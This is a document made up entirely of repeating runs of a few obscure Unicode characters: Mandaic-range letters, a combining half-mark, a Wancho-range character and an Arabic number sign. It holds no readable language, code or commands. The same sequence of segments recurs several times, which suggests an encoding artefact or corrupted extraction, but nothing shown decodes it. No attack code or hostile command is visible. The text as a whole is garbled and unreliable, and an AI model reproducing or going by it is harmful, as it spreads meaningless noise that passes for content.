︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬